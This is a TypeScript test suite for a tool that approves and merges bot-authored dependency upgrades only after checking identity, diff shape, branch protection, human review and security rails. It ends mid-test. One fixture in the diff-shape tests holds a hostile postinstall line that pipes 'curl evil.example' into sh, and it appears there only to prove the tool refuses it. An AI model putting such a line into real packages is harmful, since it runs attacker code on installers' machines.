import { describe, it, expect } from "vitest";
import { FakeGitHubGateway } from "../../test/fakes/fake-github.js";
import { approveDependencyUpgrade } from "./approve-dependency-upgrade.js";
import { findActionMarkers } from "../expedition/action-marker.js";
import { DEFAULT_GATE_POLICY, DEPS_GATE_POLICY } from "../expedition/gate.js";
import type { BranchProtectionSummary, CheckResult, DetailedPullFile, Mergeability } from "../github.js";

const REPO = "o/r";
const PR = 1;
const ME = "me";
const BOT = "dependabot[bot]";
const HEAD = "sha0001";

/** Branch protection that requires `count` approving reviews and nothing else. */
const requiresApprovals = (count: number): BranchProtectionSummary => ({
  requiresPullRequestReviews: true,
  requiredApprovingReviewCount: count,
  requiredChecks: [],
  enforceAdmins: false,
  requiresConversationResolution: false,
});

const mergeable = (state: Mergeability["state"]): Mergeability =>
  ({ state, mergeable: state === "clean", draft: false, baseRef: "main", headSha: HEAD });

/**
 * A protected base branch as GitHub really presents it while the required review is missing:
 * protection asking for `count` approvals AND a mergeable state of "blocked".
 *
 * The pairing is the point. Seeding protection while leaving the mergeable state clean describes a
 * pull request GitHub cannot produce, and that impossible combination is what hid the rail 4 deadlock
 * from two review passes.
 */
function seedProtectedAwaitingReview(gh: FakeGitHubGateway, count: number, over: Partial<BranchProtectionSummary> = {}): void {
  gh.setBranchProtection(REPO, "main", { ...requiresApprovals(count), ...over });
  gh.setMergeability(REPO, PR, mergeable("blocked"));
}

/**
 * What GitHub does once the approval it was waiting for arrives: mergeStateStatus is recomputed, and
 * a pull request blocked only by the missing review becomes clean.
 */
class RecomputesOnApproval extends FakeGitHubGateway {
  async submitReview(...args: Parameters<FakeGitHubGateway["submitReview"]>): Promise<{ url: string }> {
    const result = await super.submitReview(...args);
    this.setMergeability(REPO, PR, mergeable("clean"));
    return result;
  }
}

const bumpPatch = (name: string, from: string, to: string): string =>
  ["@@ -12,7 +12,7 @@", '   "dependencies": {', `-    "${name}": "${from}",`, `+    "${name}": "${to}",`, '     "zod": "^3.23.0"'].join("\n");

const manifest = (patch: string): DetailedPullFile => ({ filename: "package.json", status: "modified", additions: 1, deletions: 1, patch });
const lockfile: DetailedPullFile = { filename: "package-lock.json", status: "modified", additions: 12, deletions: 12, patch: "@@ -1 +1 @@\n-a\n+b" };

// A bot-authored patch bump with green checks and no protection: every rail clears except autonomy.
// The optional second argument seeds a gateway subclass instead, for the tests that need a read to
// change its answer between calls.
function seedBotBump<T extends FakeGitHubGateway = FakeGitHubGateway>(
  files: DetailedPullFile[] = [manifest(bumpPatch("left-pad", "^1.0.0", "^1.0.1")), lockfile],
  gh: T = new FakeGitHubGateway() as T,
): T {
  gh.seedPr({ number: PR, title: "chore(deps): bump left-pad", author: BOT, headSha: HEAD, baseSha: "base", url: "u", state: "open", labels: [] });
  gh.setActorType(BOT, "Bot");
  gh.setDetailedFiles(REPO, PR, files);
  gh.setChecks(REPO, HEAD, [{ name: "build", status: "success" }]);
  // Stated explicitly, because the fake's unseeded default is "unknown" and fails rail 4. "clean" is
  // the honest value for this fixture: no protection, so nothing is waiting on a review.
  gh.setMergeability(REPO, PR, mergeable("clean"));
  return gh;
}

const run = (gh: FakeGitHubGateway, over: Partial<Parameters<typeof approveDependencyUpgrade>[1]> = {}) =>
  approveDependencyUpgrade(gh, { repo: REPO, pr: PR, actingLogin: ME, now: "2026-08-07T10:00:00Z", ...over });

describe("approveDependencyUpgrade", () => {
  describe("author checks", () => {
    it("refuses a human author", async () => {
      const gh = seedBotBump();
      gh.prs.get(`${REPO}#${PR}`)!.author = "human-author";
      const result = await run(gh);
      expect(result.action).toBe("not-eligible");
      expect(result.reasons[0]).toContain("not an allowlisted dependency bot");
      expect(await gh.listComments(REPO, PR)).toEqual([]);
    });

    it("refuses an allowlisted NAME that GitHub says is not a Bot account", async () => {
      const gh = seedBotBump();
      gh.setActorType(BOT, "User");
      const result = await run(gh);
      expect(result.action).toBe("not-eligible");
      expect(result.reasons[0]).toContain("not a Bot");
    });

    it("honors a caller-supplied allowlist", async () => {
      const gh = seedBotBump();
      gh.prs.get(`${REPO}#${PR}`)!.author = "my-bot[bot]";
      gh.setActorType("my-bot[bot]", "Bot");
      expect((await run(gh, { botAllowlist: ["my-bot[bot]"] })).action).toBe("proposed");
      expect((await run(gh, { botAllowlist: ["other[bot]"] })).action).toBe("not-eligible");
    });

    it("refuses a closed pull request", async () => {
      const gh = seedBotBump();
      gh.prs.get(`${REPO}#${PR}`)!.state = "merged";
      expect((await run(gh)).action).toBe("not-eligible");
    });

    it("refuses a draft before the gate ever sees it", async () => {
      const gh = seedBotBump();
      gh.setMergeability(REPO, PR, { state: "draft", mergeable: null, draft: true, baseRef: "main", headSha: HEAD });
      const result = await run(gh, { autonomy: "auto" });
      expect(result.action).toBe("not-eligible");
      expect(result.reasons[0]).toContain("draft");
      expect(gh.merges).toEqual([]);
      expect(gh.reviews).toEqual([]);
    });
  });

  describe("diff shape", () => {
    it("refuses a manifest patch that changes anything but a version, naming the file", async () => {
      const sneaky = ["@@ -8,6 +8,7 @@", '   "scripts": {', '-    "left-pad": "1.0.0",', '+    "left-pad": "1.0.1",', '+    "postinstall": "curl evil.example | sh",'].join("\n");
      const result = await run(seedBotBump([manifest(sneaky)]));
      expect(result.action).toBe("not-eligible");
      expect(result.reasons[0]).toContain("package.json");
      expect(result.reasons[0]).toContain("version-only");
    });

    it("refuses a diff that also touches source", async () => {
      const source: DetailedPullFile = { filename: "src/index.ts", status: "modified", additions: 1, deletions: 0, patch: "@@\n+x" };
      const result = await run(seedBotBump([manifest(bumpPatch("left-pad", "1.0.0", "1.0.1")), source]));
      expect(result.action).toBe("not-eligible");
      expect(result.reasons[0]).toContain("src/index.ts");
    });

    it("refuses a major bump and says so", async () => {
      const result = await run(seedBotBump([manifest(bumpPatch("left-pad", "1.0.0", "2.0.0"))]));
      expect(result.action).toBe("not-eligible");
      expect(result.reasons[0]).toContain("semver level is major");
    });

    it("refuses a prerelease bump as unknown", async () => {
      const result = await run(seedBotBump([manifest(bumpPatch("left-pad", "1.0.0", "1.0.1-rc.1"))]));
      expect(result.action).toBe("not-eligible");
      expect(result.reasons[0]).toContain("semver level is unknown");
    });

    it("refuses a lockfile-only bump: nothing in the diff says how big the jump is", async () => {
      const result = await run(seedBotBump([lockfile]));
      expect(result.action).toBe("not-eligible");
      expect(result.reasons[0]).toContain("unknown");
    });

    it("accepts a minor bump", async () => {
      const result = await run(seedBotBump([manifest(bumpPatch("zod", "^3.23.0", "^3.24.0"))]));
      expect(result.action).toBe("proposed");
    });
  });

  describe("propose mode (the default)", () => {
    it("posts one proposal naming the bump, and neither approves nor merges", async () => {
      const gh = seedBotBump();
      const result = await run(gh);
      expect(result.action).toBe("proposed");
      expect(result.reasons).toEqual(['autonomy is "propose", not "auto"']);
      expect(gh.reviews).toEqual([]);
      expect(gh.merges).toEqual([]);

      const comments = await gh.listComments(REPO, PR);
      expect(comments).toHaveLength(1);
      expect(comments[0].body).toContain("approve and merge this patch dependency upgrade");
      expect(comments[0].body).toContain("`left-pad`: ^1.0.0 -> ^1.0.1");
      expect(findActionMarkers(comments)[0].marker).toMatchObject({ kind: "dep-upgrade-proposal", headSha: HEAD });
    });

    it("a second run at the same head reports already-proposed and posts no duplicate", async () => {
      const gh = seedBotBump();
      await run(gh);
      expect((await run(gh)).action).toBe("already-proposed");
      expect(await gh.listComments(REPO, PR)).toHaveLength(1);
    });

    it("replaces its own stale proposal after the bot force-pushes", async () => {
      const gh = seedBotBump();
      await run(gh);
      gh.prs.get(`${REPO}#${PR}`)!.headSha = "sha0002";
      gh.setChecks(REPO, "sha0002", [{ name: "build", status: "success" }]);
      expect((await run(gh)).action).toBe("proposed");
      const comments = await gh.listComments(REPO, PR);
      expect(comments).toHaveLength(1);
      expect(findActionMarkers(comments)[0].marker.headSha).toBe("sha0002");
    });

    it("an omitted autonomy is propose even on a flawless bot bump", async () => {
      const gh = seedBotBump();
      expect((await run(gh)).action).toBe("proposed");
      expect(gh.merges).toEqual([]);
    });
  });

  describe("acting identity", () => {
    it("resolves the acting login from the token when none is given", async () => {
      const gh = seedBotBump();
      await approveDependencyUpgrade(gh, { repo: REPO, pr: PR, now: "t1" });
      expect((await gh.listComments(REPO, PR))[0].author).toBe(ME);
      expect((await approveDependencyUpgrade(gh, { repo: REPO, pr: PR, now: "t2" })).action).toBe("already-proposed");
    });

    it("throws rather than acting under a login the token does not own", async () => {
      const gh = seedBotBump();
      await expect(run(gh, { actingLogin: "not-me", autonomy: "auto" })).rejects.toThrow(/not the authenticated login/);
      expect(gh.reviews).toEqual([]);
      expect(gh.merges).toEqual([]);
    });
  });

  describe("auto mode", () => {
    it("approves at the evaluated head, then merges it", async () => {
      const gh = seedBotBump();
      const result = await run(gh, { autonomy: "auto", mergeMethod: "squash" });
      expect(result).toEqual({ action: "approved-and-merged", reasons: [] });
      expect(gh.reviews).toHaveLength(1);
      expect(gh.reviews[0]).toMatchObject({ author: ME, event: "APPROVE", state: "APPROVED", commitId: HEAD });
      expect(gh.reviews[0].body).toContain("patch dependency upgrade");
      expect(gh.merges).toEqual([{ repo: REPO, pr: PR, sha: HEAD, method: "squash", commitTitle: undefined }]);
      expect(await gh.listComments(REPO, PR)).toEqual([]);
    });

    it("does not stack a second approval when one already stands at this head", async () => {
      const gh = seedBotBump();
      await gh.submitReview(REPO, PR, { commitId: HEAD, event: "APPROVE", body: "approved on an earlier tick" });
      const result = await run(gh, { autonomy: "auto" });
      expect(result.action).toBe("approved-and-merged");
      expect(gh.reviews).toHaveLength(1); // the standing approval, not a duplicate
      expect(gh.merges).toHaveLength(1);
    });

    it("approves again once the head has moved past the standing approval", async () => {
      const gh = seedBotBump();
      await gh.submitReview(REPO, PR, { commitId: "sha0000", event: "APPROVE", body: "approved a previous head" });
      const result = await run(gh, { autonomy: "auto" });
      expect(result.action).toBe("approved-and-merged");
      expect(gh.reviews).toHaveLength(2);
      expect(gh.reviews[1].commitId).toBe(HEAD);
    });

    it("still refuses to self-approve when the acting agent is the bot author", async () => {
      const gh = seedBotBump();
      gh.login = BOT; // the token really is the bot's, so the identity check passes and the rail bites
      const result = await run(gh, { autonomy: "auto", actingLogin: BOT });
      expect(result.action).toBe("proposed");
      expect(result.reasons.some((r) => r.includes("self-approval"))).toBe(true);
      expect(gh.merges).toEqual([]);
      expect(gh.reviews).toEqual([]);
    });

    it("holds off when a human has an open review request", async () => {
      const gh = seedBotBump();
      gh.setRequestedReviewers(REPO, PR, { users: ["alice"], teams: [] });
      const result = await run(gh, { autonomy: "auto" });
      expect(result.action).toBe("proposed");
      expect(result.reasons.some((r) => r.includes("human review"))).toBe(true);
      expect(gh.reviews).toEqual([]); // no approval is submitted on the propose path
    });

    it("fails the alert rail closed when the alert API cannot be read", async () => {
      const gh = seedBotBump();
      gh.setAlertCount(REPO, null);
      const result = await run(gh, { autonomy: "auto" });
      expect(result.action).toBe("proposed");
      expect(result.reasons.some((r) => r.includes("failing closed"))).toBe(true);
    });
  });

  // Issue #48: on a repository that requires an approving review, the operation whose own approval is
  // the thing that would satisfy the requirement could not get past the rails that were failing
  // BECAUSE the approval was missing. Two rails, discovered one after the other: rail 5 (branch
  // protection counts the required approvals) and rail 4 (GitHub reports the pull request as
  // "blocked" the whole time it waits for that review). Every fixture here therefore seeds both
  // facts, because GitHub always reports them together.
  describe("a repository that requires an approving review", () => {
    it("approves and merges when one approval is required and none stands yet", async () => {
      // The production sequence end to end: blocked and unapproved, this agent approves, GitHub
      // recomputes the mergeable state, the re-check sees a genuinely clean state, and it merges.
      const gh = seedBotBump(undefined, new RecomputesOnApproval());
      seedProtectedAwaitingReview(gh, 1);

      const result = await run(gh, { autonomy: "auto" });
      expect(result).toEqual({ action: "approved-and-merged", reasons: [] });
      expect(gh.reviews).toHaveLength(1);
      expect(gh.reviews[0]).toMatchObject({ author: ME, event: "APPROVE", state: "APPROVED", commitId: HEAD });
      expect(gh.merges).toEqual([{ repo: REPO, pr: PR, sha: HEAD, method: "merge", commitTitle: undefined }]);
    });

    // The same repository, with a gateway that never recomputes: the approval lands and the merge
    // does not, because the only thing rail 4's tolerance ever buys is the approval itself.
    it("approves but does not merge while GitHub still reports blocked afterwards", async () => {
      const gh = seedBotBump();
      seedProtectedAwaitingReview(gh, 1);

      const result = await run(gh, { autonomy: "auto" });
      expect(result.action).toBe("approved");
      expect(result.reasons.some((r) => r.includes("mergeable state is blocked (need clean)"))).toBe(true);
      expect(gh.reviews).toHaveLength(1); // the approval is real and durable
      expect(gh.merges).toEqual([]);      // and nothing was merged on a state we cannot verify
      expect((await gh.getPullRequest(REPO, PR)).state).toBe("open");
    });

    it("proposes instead when two approvals are required and none stands: the pending one adds exactly one", async () => {
      const gh = seedBotBump();
      seedProtectedAwaitingReview(gh, 2);

      const result = await run(gh, { autonomy: "auto" });
      expect(result.action).toBe("proposed");
      expect(result.reasons).toEqual(["branch protection requirements are not satisfied"]);
      expect(gh.reviews).toEqual([]); // nothing was approved on the propose path
      expect(gh.merges).toEqual([]);
    });

    it("does not count its own standing approval twice toward a two-approval requirement", async () => {
      const gh = seedBotBump();
      seedProtectedAwaitingReview(gh, 2);
      // One approval by this agent already stands, so it is already inside approvalsByOthers. Adding
      // a pending one on top would reach two and merge on a single approval.
      await gh.submitReview(REPO, PR, { commitId: HEAD, event: "APPROVE", body: "approved on an earlier tick" });

      const result = await run(gh, { autonomy: "auto" });
      expect(result.action).toBe("proposed");
      expect(result.reasons).toContain("branch protection requirements are not satisfied");
      // A standing approval also withholds the rail 4 allowance, so GitHub's own "blocked" is a
      // second, equally correct reason. Both say the same thing: one approval is not two.
      expect(result.reasons).toContain("mergeable state is blocked (need clean)");
      expect(gh.reviews).toHaveLength(1); // the standing one, unchanged
      expect(gh.merges).toEqual([]);
    });

    // The same double count, reached through a case difference rather than through a SHA filter. The
    // fake records the review under the login that submitted it, so this is exactly what a gateway
    // returning "Me" for an agent configured as "me" would produce.
    it("does not double count its own standing approval when the API spells the login differently", async () => {
      const gh = seedBotBump();
      seedProtectedAwaitingReview(gh, 2);
      gh.login = "Me";
      await gh.submitReview(REPO, PR, { commitId: HEAD, event: "APPROVE", body: "approved on an earlier tick" });
      gh.login = ME;

      // "Me" is listed as an agent so rail 7 stays quiet and the protection arithmetic is the only
      // thing deciding. (Left unlisted, human-review.ts reads the differently-cased login as a human
      // and holds the pull request anyway, which its own comment calls the safe direction.)
      const result = await run(gh, { autonomy: "auto", knownAgentLogins: ["Me"] });
      expect(result.action).toBe("proposed");
      expect(result.reasons).toContain("branch protection requirements are not satisfied");
      expect(gh.reviews).toHaveLength(1);
      expect(gh.merges).toEqual([]);
    });

    it("reaches a two-approval requirement alongside another reviewer's approval", async () => {
      const gh = seedBotBump(undefined, new RecomputesOnApproval());
      seedProtectedAwaitingReview(gh, 2);
      gh.login = "peer-agent"; // someone else's approval, submitted as that login
      await gh.submitReview(REPO, PR, { commitId: HEAD, event: "APPROVE", body: "looks fine" });
      gh.login = ME;

      // Listed as an agent, because a review by anyone who is NOT a known agent fails rail 7 as well
      // (a human's approval holds the pull request for the human, which is stricter still).
      const result = await run(gh, { autonomy: "auto", knownAgentLogins: ["peer-agent"] });
      expect(result.action).toBe("approved-and-merged");
      expect(gh.reviews.map((r) => r.author)).toEqual(["peer-agent", ME]);
      expect(gh.merges).toHaveLength(1);
    });

    it("holds off when the other standing approval is a human's, even at two of two", async () => {
      const gh = seedBotBump();
      seedProtectedAwaitingReview(gh, 2);
      gh.login = "alice";
      await gh.submitReview(REPO, PR, { commitId: HEAD, event: "APPROVE", body: "looks fine" });
      gh.login = ME;

      const result = await run(gh, { autonomy: "auto" });
      expect(result.action).toBe("proposed");
      expect(result.reasons.some((r) => r.includes("human review"))).toBe(true);
      expect(gh.merges).toEqual([]);
    });

    // The tolerance is for "blocked" alone, and only because a missing required review is a blocker
    // this call is about to remove. No other state has that property: a conflict, a failing
    // non-required check, or a state GitHub will not tell us about are not fixed by approving.
    it.each(["dirty", "unstable", "unknown", "behind"] as const)("still refuses a %s mergeable state", async (state) => {
      const gh = seedBotBump();
      gh.setBranchProtection(REPO, "main", requiresApprovals(1));
      gh.setMergeability(REPO, PR, { state, mergeable: false, draft: false, baseRef: "main", headSha: HEAD });

      const result = await run(gh, { autonomy: "auto" });
      expect(result.action).toBe("proposed");
      expect(result.reasons).toContain(`mergeable state is ${state} (need clean)`);
      expect(gh.reviews).toEqual([]); // nothing is approved to find out
      expect(gh.merges).toEqual([]);
    });

    it("gives the acting agent no credit when it is the author itself", async () => {
      const gh = seedBotBump();
      seedProtectedAwaitingReview(gh, 1);
      gh.login = BOT; // the token really is the bot's, so the identity check passes

      const result = await run(gh, { autonomy: "auto", actingLogin: BOT });
      expect(result.action).toBe("proposed");
      // Both rails fire: GitHub would not accept the approval, so it cannot count toward protection.
      expect(result.reasons).toContain("branch protection requirements are not satisfied");
      expect(result.reasons.some((r) => r.includes("self-approval"))).toBe(true);
      expect(gh.reviews).toEqual([]);
      expect(gh.merges).toEqual([]);
    });
  });

  // The merge is judged against state read AFTER the approval landed, never on the strength of the
  // pending-approval arithmetic that authorized the approval itself. And it is judged by the GATE, on
  // every rail, because approving is a write and the window it opens is long enough for a human to
  // arrive: a hand-picked list of rails worth re-reading is a list someone can forget to extend.
  describe("the re-check between approving and merging", () => {
    /** Green on the first read, failing afterwards: a required check that started a new run. */
    class ChecksTurnRed extends FakeGitHubGateway {
      reads = 0;
      async getChecks(repo: string, ref: string): Promise<CheckResult[]> {
        this.reads += 1;
        return [{ name: "build", status: this.reads === 1 ? "success" : "failure" }];
      }
    }

    /**
     * Runs `mutate` at the moment the approval lands: the window every case below exercises.
     *
     * `mutate` writes to the fake's own state directly rather than calling a gateway method, because
     * it runs INSIDE the overridden submitReview and calling that again would recurse.
     */
    function inTheWindow(mutate: (gh: FakeGitHubGateway) => void): FakeGitHubGateway {
      class DuringApproval extends FakeGitHubGateway {
        async submitReview(...args: Parameters<FakeGitHubGateway["submitReview"]>): Promise<{ url: string }> {
          const result = await super.submitReview(...args);
          mutate(this);
          return result;
        }
      }
      return seedBotBump(undefined, new DuringApproval());
    }

    /** A review row landing on the pull request from someone else, as the fake stores them. */
    const pushReview = (gh: FakeGitHubGateway, author: string, state: string): void => {
      gh.reviews.push({ repo: REPO, pr: PR, id: 900 + gh.reviews.length, author, state, event: state, body: "", commitId: HEAD, submittedAt: "t900" });
    };

    /** The approval landed, nothing merged, and the reasons say the re-check is what stopped it. */
    async function expectApprovedNotMerged(gh: FakeGitHubGateway, blocker: string): Promise<void> {
      const result = await run(gh, { autonomy: "auto" });
      expect(result.action).toBe("approved");
      expect(result.reasons[0]).toContain("the merge did not happen: re-checking every rail after approving");
      expect(result.reasons.some((r) => r.includes(blocker)), result.reasons.join(" | ")).toBe(true);
      // Exactly one approval of ours, at the commit that was evaluated, and no merge at all.
      const mine = gh.reviews.filter((r) => r.author === ME);
      expect(mine).toHaveLength(1);
      expect(mine[0]).toMatchObject({ event: "APPROVE", state: "APPROVED", commitId: HEAD });
      expect(gh.merges).toEqual([]);
      expect((await gh.getPullRequest(REPO, PR)).state).toBe("open");
    }

    it("returns approved with the approval recorded and no merge when protection is still unsatisfied", async () => {
      const gh = seedBotBump(undefined, new ChecksTurnRed());
      gh.setBranchProtection(REPO, "main", { ...requiresApprovals(1), requiredChecks: ["build"] });

      const result = await run(gh, { autonomy: "auto" });
      expect(result.action).toBe("approved");
      expect(result.reasons).toContain("branch protection requirements are not satisfied");
      // The approval is durable and did happen; the merge did not.
      expect(gh.reviews).toHaveLength(1);
      expect(gh.reviews[0]).toMatchObject({ author: ME, event: "APPROVE", commitId: HEAD });
      expect(gh.merges).toEqual([]);
      expect((await gh.getPullRequest(REPO, PR)).state).toBe("open");
    });

    // Four rails that the first evaluation passed and the after-state does not. Each one used to
    // merge anyway, because the re-check looked at protection, mergeability, and the head only.
    it("refuses the merge when a human posts CHANGES_REQUESTED while the approval is landing", async () => {
      const gh = inTheWindow((self) => pushReview(self, "alice", "CHANGES_REQUESTED"));
      await expectApprovedNotMerged(gh, "a human review is in flight");
    });

    it("refuses the merge when a human is asked to review while the approval is landing", async () => {
      const gh = inTheWindow((self) => self.setRequestedReviewers(REPO, PR, { users: ["alice"], teams: [] }));
      await expectApprovedNotMerged(gh, "a human review is in flight");
    });

    it("refuses the merge when a security alert appears while the approval is landing", async () => {
      const gh = inTheWindow((self) => self.setAlertCount(REPO, 2));
      await expectApprovedNotMerged(gh, "the security alert rail is not satisfied");
      // and the specific cause is quoted, not just the rail
      const result = await run(seedBotBump(), { autonomy: "auto" }); // sanity: a clean run still merges
      expect(result.action).toBe("approved-and-merged");
    });

    // The rollup goes red on a repository whose protection declares no required checks, so
    // protectionSatisfied has nothing to say about it and only rail 3 catches it.
    it("refuses the merge when the checks go red with no required checks declared", async () => {
      const gh = seedBotBump(undefined, new ChecksTurnRed());
      // Zero required approvals, so nothing is waiting on a review and the clean state this fixture
      // starts from is one GitHub can really report. requiredChecks stays empty, which is the point.
      gh.setBranchProtection(REPO, "main", requiresApprovals(0));
      await expectApprovedNotMerged(gh, "required checks are failing (need green)");
    });

    it("quotes the security cause, not only the rail, when the alert count appears in the window", async () => {
      const gh = inTheWindow((self) => self.setAlertCount(REPO, null));
      const result = await run(gh, { autonomy: "auto" });
      expect(result.action).toBe("approved");
      expect(result.reasons.some((r) => r.includes("failing closed"))).toBe(true);
      expect(gh.merges).toEqual([]);
    });

    /** The bot force-pushes in the moment between the approval and the merge. */
    class HeadMovesOnApproval extends FakeGitHubGateway {
      async submitReview(...args: Parameters<FakeGitHubGateway["submitReview"]>): Promise<{ url: string }> {
        const result = await super.submitReview(...args);
        this.prs.get(`${REPO}#${PR}`)!.headSha = "sha0002";
        return result;
      }
    }

    it("returns approved without attempting a merge when the head moved after the approval", async () => {
      const gh = seedBotBump(undefined, new HeadMovesOnApproval());
      seedProtectedAwaitingReview(gh, 1);

      const result = await run(gh, { autonomy: "auto" });
      expect(result.action).toBe("approved");
      expect(result.reasons.some((r) => r.includes("head SHA guard failed"))).toBe(true);
      expect(gh.reviews[0].commitId).toBe(HEAD); // the approval names the commit it judged
      expect(gh.merges).toEqual([]);
    });

    /** Clean on the first read, blocked afterwards: GitHub recomputing mergeability. */
    class MergeabilityTurnsBlocked extends FakeGitHubGateway {
      reads = 0;
      async getMergeability(repo: string, pr: number): Promise<Mergeability> {
        this.reads += 1;
        return { state: this.reads === 1 ? "clean" : "blocked", mergeable: this.reads === 1, draft: false, baseRef: "main", headSha: HEAD };
      }
    }

    it("returns approved when the mergeable state stops being clean after the approval", async () => {
      const gh = seedBotBump(undefined, new MergeabilityTurnsBlocked());
      gh.setBranchProtection(REPO, "main", requiresApprovals(0)); // clean at the first read is real

      const result = await run(gh, { autonomy: "auto" });
      expect(result.action).toBe("approved");
      expect(result.reasons.some((r) => r.includes("mergeable state is blocked"))).toBe(true);
      expect(gh.reviews).toHaveLength(1);
      expect(gh.merges).toEqual([]);
    });

    it("reports approved rather than blocked when the merge itself is refused", async () => {
      const gh = seedBotBump(undefined, new RecomputesOnApproval());
      seedProtectedAwaitingReview(gh, 1);
      // The re-check after approving is satisfied, and the merge call is the thing that refuses.
      gh.mergePull = async () => ({ merged: false, sha: null, message: "not mergeable", reason: "not-mergeable" });

      const result = await run(gh, { autonomy: "auto" });
      expect(result.action).toBe("approved"); // the approval landed, so "blocked" would hide it
      expect(result.reasons).toEqual(["merge refused (not-mergeable): not mergeable"]);
      expect(gh.reviews).toHaveLength(1);
    });

    // The standing verdict and the "did I already approve at this head" guard have to agree. An
    // APPROVED row at this head followed by a CHANGES_REQUESTED at the same head satisfies a naive
    // row scan while the STANDING verdict is a refusal, so rail 5 grants a pending approval that the
    // guard then declines to submit: the tool would report "approved" on every tick forever while its
    // own outstanding CHANGES_REQUESTED kept the pull request blocked.
    it("submits a fresh approval when its own standing verdict at this head is no longer an approval", async () => {
      const gh = seedBotBump(undefined, new RecomputesOnApproval());
      seedProtectedAwaitingReview(gh, 1);
      await gh.submitReview(REPO, PR, { commitId: HEAD, event: "APPROVE", body: "approved earlier" });
      await gh.submitReview(REPO, PR, { commitId: HEAD, event: "REQUEST_CHANGES", body: "then found a problem" });

      const result = await run(gh, { autonomy: "auto" });
      expect(result.action).toBe("approved-and-merged"); // not a permanent "approved" loop
      expect(gh.reviews).toHaveLength(3);
      expect(gh.reviews[2]).toMatchObject({ author: ME, event: "APPROVE", commitId: HEAD });
      expect(gh.merges).toHaveLength(1);
    });

    it("re-checks even when the approval was submitted on an earlier tick", async () => {
      const gh = seedBotBump(undefined, new ChecksTurnRed());
      gh.setBranchProtection(REPO, "main", { ...requiresApprovals(1), requiredChecks: ["build"] });
      await gh.submitReview(REPO, PR, { commitId: HEAD, event: "APPROVE", body: "approved on an earlier tick" });
      gh.reads = 0; // the seeded approval is not a read of the checks

      const result = await run(gh, { autonomy: "auto" });
      expect(result.action).toBe("approved");
      expect(gh.reviews).toHaveLength(1); // no second approval stacked on
      expect(gh.merges).toEqual([]);
    });
  });

  // A dismissal is a maintainer overruling this agent's approval, in the loudest way GitHub offers,
  // and it is invisible to every other rail: dismissing creates no review by the dismisser, so rail 7
  // sees no human in flight, and it clears the standing approval, which is what would otherwise make
  // this operation re-approve the verdict a human just struck down.
  describe("an approval a human dismissed", () => {
    /** Submit an approval at `commitId`, then have a maintainer dismiss it. */
    async function dismissedApproval(gh: FakeGitHubGateway, commitId: string): Promise<void> {
      await gh.submitReview(REPO, PR, { commitId, event: "APPROVE", body: "approved on an earlier tick" });
      gh.reviews[gh.reviews.length - 1].state = "DISMISSED"; // what a maintainer's dismissal leaves behind
    }

    it("is a hard stop on the auto path: it proposes, approves nothing, and merges nothing", async () => {
      const gh = seedBotBump();
      seedProtectedAwaitingReview(gh, 1);
      await dismissedApproval(gh, HEAD);

      const result = await run(gh, { autonomy: "auto" });
      expect(result.action).toBe("proposed");
      expect(result.reasons.some((r) => r.includes("dismissed"))).toBe(true);
      expect(gh.reviews).toHaveLength(1); // the dismissed one, and no replacement
      expect(gh.merges).toEqual([]);
      // The reason reaches the maintainer, not just the return value.
      expect((await gh.listComments(REPO, PR))[0].body).toContain("dismissed");
    });

    it("stops even where protection would not have needed the approval at all", async () => {
      const gh = seedBotBump(); // no protection: rail 5 was never the obstacle
      await dismissedApproval(gh, HEAD);
      const result = await run(gh, { autonomy: "auto" });
      expect(result.action).toBe("proposed");
      expect(gh.merges).toEqual([]);
    });

    it("does not stop on a dismissal left at an earlier head: that verdict was about another diff", async () => {
      const gh = seedBotBump(undefined, new RecomputesOnApproval());
      seedProtectedAwaitingReview(gh, 1);
      await dismissedApproval(gh, "sha0000");

      const result = await run(gh, { autonomy: "auto" });
      expect(result.action).toBe("approved-and-merged");
      expect(gh.merges).toHaveLength(1);
    });
  });

  // A dependency upgrade is judged on the content and authorship rails, not on its line count: the
  // manifest lines are verified and lockfile content is never read at all. See DEPS_GATE_POLICY.
  describe("the dependency size policy", () => {
    const bigLockfile = (lines: number): DetailedPullFile => ({
      filename: "package-lock.json", status: "modified", additions: lines, deletions: 0, patch: "@@ -1 +1 @@\n-a\n+b",
    });
    const withLockfile = (lines: number): DetailedPullFile[] => [manifest(bumpPatch("left-pad", "^1.0.0", "^1.0.1")), bigLockfile(lines)];

    it("passes a lockfile-sized diff that the general default cap would refuse", async () => {
      expect(1200).toBeGreaterThan(DEFAULT_GATE_POLICY.maxLines); // the cap that used to hold this back
      expect(1202).toBeLessThanOrEqual(DEPS_GATE_POLICY.maxLines);
      const gh = seedBotBump(withLockfile(1200));

      const result = await run(gh, { autonomy: "auto" });
      expect(result.action).toBe("approved-and-merged");
      expect(gh.merges).toHaveLength(1);
    });

    it("still refuses a diff past the dependency cap", async () => {
      const gh = seedBotBump(withLockfile(5000));
      const result = await run(gh, { autonomy: "auto" });
      expect(result.action).toBe("proposed");
      expect(result.reasons.some((r) => r.includes(`too many changed lines (5002 > ${DEPS_GATE_POLICY.maxLines})`))).toBe(true);
      expect(gh.merges).toEqual([]);
    });

    it("still applies the file-count cap, which the deps policy does not widen", async () => {
      expect(DEPS_GATE_POLICY.maxFiles).toBe(DEFAULT_GATE_POLICY.maxFiles);
      const many = Array.from({ length: DEPS_GATE_POLICY.maxFiles + 1 }, (_, i) => ({
        ...bigLockfile(2), filename: `packages/p${i}/package-lock.json`,
      }));
      const gh = seedBotBump([manifest(bumpPatch("left-pad", "^1.0.0", "^1.0.1")), ...many]);
      const result = await run(gh, { autonomy: "auto" });
      expect(result.action).toBe("proposed");
      expect(result.reasons.some((r) => r.includes("too many changed files"))).toBe(true);
    });

    it("lets a caller tighten the caps but not widen them (the tool clamps; the operation obeys)", async () => {
      const gh = seedBotBump(withLockfile(1200));
      const tightened = await run(gh, { autonomy: "auto", policy: { maxLines: 100 } });
      expect(tightened.action).toBe("proposed");
      expect(tightened.reasons.some((r) => r.includes("too many changed lines (1202 > 100)"))).toBe(true);
      expect(gh.merges).toEqual([]);

      // Tightening one cap must not silently restore the general 200-line default for the other.
      const other = seedBotBump(withLockfile(1200));
      expect((await run(other, { autonomy: "auto", policy: { maxFiles: 5 } })).action).toBe("approved-and-merged");
    });
  });

  describe("the approving review body", () => {
    it("carries the verdict: packages, semver level, size, head SHA, and the rails", async () => {
      const gh = seedBotBump([
        manifest([
          "@@ -12,9 +12,9 @@",
          '   "dependencies": {',
          '-    "left-pad": "^1.0.0",',
          '+    "left-pad": "^1.0.1",',
          '-    "zod": "^3.23.0",',
          '+    "zod": "^3.24.0",',
        ].join("\n")),
        lockfile,
      ]);
      await run(gh, { autonomy: "auto" });

      const body = gh.reviews[0].body;
      expect(body).toContain("automated steward approval of a bot-authored dependency change");
